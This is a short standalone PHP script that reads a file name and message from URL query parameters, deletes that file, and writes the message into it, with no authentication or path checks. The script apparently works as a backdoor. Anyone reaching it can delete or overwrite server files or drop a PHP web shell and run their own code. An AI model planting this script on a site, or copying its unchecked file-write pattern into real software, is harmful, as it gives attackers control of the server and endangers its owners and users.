<?php 
 $Message = $_GET["message"];
 $Filename = $_GET['file']; 
 unlink($Filename);
 $Handle = fopen($Filename, "a");
 fwrite($Handle, $Message);
 print "Data Written"; 
 fclose($Handle); 
?> 